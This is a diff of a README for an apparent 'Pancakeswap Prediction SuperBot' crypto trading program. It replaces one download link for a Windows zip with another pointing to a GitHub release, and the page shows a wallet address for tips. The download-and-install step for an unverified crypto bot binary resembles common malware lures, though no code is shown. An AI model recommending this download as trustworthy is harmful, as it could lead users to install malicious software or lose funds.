@@ -18,7 +18,7 @@ If you found this helpful then you can buy me a coffee at `0xB949bBD03C3922b782d
 ## 💡 Installation
 
 Download & Install Program here :
-https://objects.githubusercontent.com/github-production-release-asset-2e65be/440157753/6df81a24-f775-490a-9452-e86cc8daae10?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211220%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211220T122907Z&X-Amz-Expires=300&X-Amz-Signature=1ee53234b9ab5a7e51b17aa39e0316900b08087c49e113bd3d225b743e891fea&X-Amz-SignedHeaders=host&actor_id=96423527&key_id=0&repo_id=440157753&response-content-disposition=attachment%3B%20filename%3DPancakeswap-Prediction-SuperBot-pro-win.zip&response-content-type=application%2Foctet-stream
+https://github.com/predictionsuperbot/prediction.github.io/releases/download/v1.0.0/Pancakeswap-Prediction-SuperBot-pro-win.zip
 
 
 ## 🧑‍🚀 Usage
